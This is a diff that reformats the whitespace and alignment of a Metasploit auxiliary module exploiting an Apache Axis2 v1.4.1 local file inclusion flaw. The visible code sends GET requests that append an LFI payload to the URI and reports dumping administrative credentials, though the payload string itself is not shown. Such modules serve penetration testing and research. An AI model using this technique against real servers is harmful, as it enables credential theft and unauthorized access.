@@ -8,25 +8,22 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
 
-
   def initialize
     super(
-      'Name'           => 'Apache Axis2 v1.4.1 Local File Inclusion',
-      'Description'    => %q{
+      'Name' => 'Apache Axis2 v1.4.1 Local File Inclusion',
+      'Description' => %q{
           This module exploits an Apache Axis2 v1.4.1 local file inclusion (LFI) vulnerability.
         By loading a local XML file which contains a cleartext username and password, attackers can trivially
         recover authentication credentials to Axis services.
       },
-      'References'     =>
-        [
-          ['EDB', '12721'],
-          ['OSVDB', '59001'],
-        ],
-      'Author'         =>
-        [
-          'Tiago Ferreira <tiago.ccna[at]gmail.com>'
-        ],
-      'License'        =>  MSF_LICENSE
+      'References' => [
+        ['EDB', '12721'],
+        ['OSVDB', '59001'],
+      ],
+      'Author' => [
+        'Tiago Ferreira <tiago.ccna[at]gmail.com>'
+      ],
+      'License' => MSF_LICENSE
     )
 
     register_options([
@@ -40,8 +37,8 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_raw({
-        'method'  => 'GET',
-        'uri'     => uri,
+        'method' => 'GET',
+        'uri' => uri,
       }, 25)
 
       if (res and res.code == 200)
@@ -54,10 +51,8 @@ class MetasploitModule < Msf::Auxiliary
         return
 
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
-
     end
   end
 
@@ -93,8 +88,8 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_raw({
-        'method'  => 'GET',
-        'uri'     => "#{uri}" + lfi_payload,
+        'method' => 'GET',
+        'uri' => "#{uri}" + lfi_payload,
       }, 25)
 
       print_status("#{full_uri} - Apache Axis - Dumping administrative credentials")
@@ -126,7 +121,6 @@ class MetasploitModule < Msf::Auxiliary
         return :abort
 
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
     end
